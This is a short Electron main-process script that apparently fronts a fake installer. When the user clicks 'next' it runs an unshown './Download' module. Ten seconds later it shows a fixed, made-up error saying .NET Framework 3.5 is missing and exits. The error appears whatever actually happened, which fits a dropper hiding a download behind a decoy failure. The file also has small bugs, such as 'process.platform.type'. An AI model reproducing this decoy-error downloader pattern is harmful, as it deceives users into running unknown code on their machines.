const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const path = require('path');

let win;

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds));
};

const createWindow = () => {
    win = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            nodeIntegration: true
        }
    });

    win.loadFile('./1.html');

    win.setMenu(null);

    win.setIcon(path.join(__dirname + '/assets/a.png'));

    win.setResizable(false);

    win.on('closed', () => delete win);
}

app.on('ready', createWindow);

app.on('window-all-closed', () => {
    if (process.platform.type !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (!win) createWindow();
});

ipcMain.on('exit', () => {
    app.quit();
})

ipcMain.on('next', () => {
    require('./Download')();
    win.loadFile('./2.html');
    sleep(10000).then(() => {
        dialog.showErrorBox('Error', `.NET Framework 3.5 or higher needs to be installed.`);
        app.quit();
    });
});